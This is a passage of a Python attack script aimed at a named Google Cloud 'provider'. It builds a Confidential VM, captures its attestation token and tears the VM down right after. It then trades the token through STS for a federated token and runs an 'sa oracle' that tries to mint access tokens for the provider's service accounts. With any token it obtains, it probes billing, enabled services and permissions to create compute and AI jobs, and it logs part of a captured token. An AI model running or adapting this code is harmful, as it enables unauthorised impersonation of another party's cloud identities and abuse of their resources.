    say('repo.get.after_remove status=%s' % st)


def sts_exchange(subject, subject_type='urn:ietf:params:oauth:token-type:jwt',
                 audience=PROVIDER):
    data = urllib.parse.urlencode({
        'grant_type': 'urn:ietf:params:oauth:grant-type:token-exchange',
        'audience': audience,
        'scope': 'https://www.googleapis.com/auth/cloud-platform',
        'requested_token_type': 'urn:ietf:params:oauth:token-type:access_token',
        'subject_token': subject,
        'subject_token_type': subject_type,
    })
    st, b = api(STS, method='POST', data=data, form=True, timeout=60)
    return st, b


def project_reads(tok, who):
    st, b = api('/v1/projects/%s/billingInfo' % PROVIDER_PROJECT,
                base='https://cloudbilling.googleapis.com', token=tok)
    j = jbody((st, b))
    say('billing.%s status=%s billingEnabled=%s name=%s %s' % (
        who, st, j.get('billingEnabled'), j.get('name'), '' if st == 200 else cap(b, 300)))
    st, b = api('/v1/projects/%s/services?pageSize=200' % PROVIDER_PROJECT, base=SU, token=tok)
    j = jbody((st, b))
    svcs = [(s.get('config') or {}).get('name') for s in (j.get('services') or [])
            if s.get('state') == 'ENABLED']
    say('services.%s status=%s enabled_count=%s %s' % (
        who, st, len(svcs), json.dumps(svcs)[:1200] if st == 200 else cap(b, 300)))
    for label, perm_set in (
            ('aiplatform', ['aiplatform.customJobs.create', 'aiplatform.endpoints.create']),
            ('run', ['run.jobs.create', 'run.services.create']),
            ('compute', ['compute.instances.create'])):
        st, b = api('/v1/projects/%s:testIamPermissions' % PROVIDER_PROJECT, method='POST',
                    data={'permissions': perm_set}, base=CRM, token=tok)
        j = jbody((st, b))
        say('testIamPermissions.%s.%s status=%s granted=%s %s' % (
            who, label, st, json.dumps(j.get('permissions')), '' if st == 200 else cap(b, 300)))


def sa_oracle(fed_token):
    say('== sa oracle (project %s) ==' % PROVIDER_PROJECT)
    out = {}
    for name in SA_NAMES:
        email = name if '@' in name else '%s@%s.iam.gserviceaccount.com' % (name, PROVIDER_PROJECT)
        body = json.dumps({'scope': ['https://www.googleapis.com/auth/cloud-platform'],
                           'lifetime': '1200s'}).encode()
        st, b = api('/v1/projects/-/serviceAccounts/%s:generateAccessToken' % email,
                    method='POST', raw_body=body, base=IAMCRED, token=fed_token, timeout=45)
        j = jbody((st, b))
        if st == 200:
            tk = j.get('accessToken') or ''
            out[name] = {'status': 200, 'len': len(tk)}
            say('sa.%s status=200 token_len=%d' % (name, len(tk)))
            if tk:
                project_reads(tk, name)
        else:
            err = (j.get('error') or {})
            out[name] = {'status': st, 'code': err.get('status'),
                         'msg': cap(err.get('message', b), 240)}
            say('sa.%s status=%s code=%s msg=%s' % (
                name, st, err.get('status'), cap(err.get('message', b), 240)))
    return out


def run():
    say('START ts=%s nonce=%s' % (time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()), NONCE))
    say('TARGET provider=%s' % PROVIDER)
    tok = get_token()
    if not tok:
        say('FATAL no cloud token; cannot proceed')
        return
    TOKEN[0] = tok
    say('CLOUD_TOKEN len=%d' % len(tok))
    identity()
    preflight()

    image_ok = False
    if ensure_ar_repo():
        image_ok = build_and_push()
    say('IMAGE_READY=%s image=%s' % (image_ok, IMAGE))

    sa_email = ensure_sa()
    grant_sa_roles(sa_email)
    ensure_bucket(sa_email)
    network, net_created = ensure_network()
    say('CVM_PLAN sa=%s network=%s created=%s' % (sa_email, network, net_created))

    zone = None
    if image_ok:
        for fam in IMG_FAMILIES:
            for z in ZONES:
                if time.time() > DEADLINE[0] - 500:
                    say('ZONE_LOOP_DEADLINE')
                    break
                zone = insert_instance(z, fam, sa_email, network)
                if zone:
                    break
            if zone:
                break
    else:
        say('IMAGE_NOT_READY: no VM created')

    token = None
    sts_inner = None
    inst_id = ''
    if zone:
        st, j, b = get_instance(zone)
        inst_id = str(j.get('id') or '')
        say('instance.get status=%s id=%s status=%s' % (st, inst_id, j.get('status')))
        token, sts_inner, blob = capture(zone, inst_id)
        if not token:
            btok, bsts = poll_bucket(150)
            if btok:
                token = btok
                say('TOKEN_FROM_BUCKET len=%d head=%s' % (len(token), token[:32]))
    else:
        say('NO_INSTANCE_CREATED')

    # Tear the CVM + disks + address + SA + repo down immediately after capture.
    teardown(zone, sa_email, net_created)

    say('== sts exchange (external) ==')
    if token:
        say('ATT_TOKEN len=%d sha256=%s' % (
            len(token), hashlib.sha256(token.encode()).hexdigest()))
        st, b = sts_exchange(token)
        say('sts.exchange status=%s body=%s' % (st, cap(b, 3500)))
        fed = jbody((st, b)).get('access_token')
        if fed:
            say('FED_TOKEN len=%d' % len(fed))
            st2, b2 = api('/tokeninfo?access_token=' + urllib.parse.quote(fed),
                          base='https://www.googleapis.com/oauth2/v1')
            j2 = jbody((st2, b2))
            say('tokeninfo.federated status=%s email=%s scopes=%s expires_in=%s' % (
                st2, j2.get('email'), cap(j2.get('scope', ''), 400), j2.get('expires_in')))
            sa_oracle(fed)
        else:
            say('sts.exchange.verdict=%s' % cap(b, 3500))
    else:
        say('NO_ATTESTATION_TOKEN')
        if sts_inner:
            say('INNER_STS_FALLBACK http=%s body=%s' % (
                sts_inner['http'], cap(sts_inner['body'], 3500)))

    say('SUMMARY token=%s inner_sts=%s zone=%s image_ok=%s elapsed=%ds' % (
        bool(token), (sts_inner or {}).get('http'), zone, image_ok, int(time.time() - START)))
    say('END ts=%s' % time.strftime('%Y-%m-%dT%H:%M:%SZ', time.gmtime()))


if __name__ == '__main__':
    try:
        run()
    except Exception as e:
        import traceback
        say('FATAL %s' % cap(repr(e), 600))
        say(traceback.format_exc()[:2500])
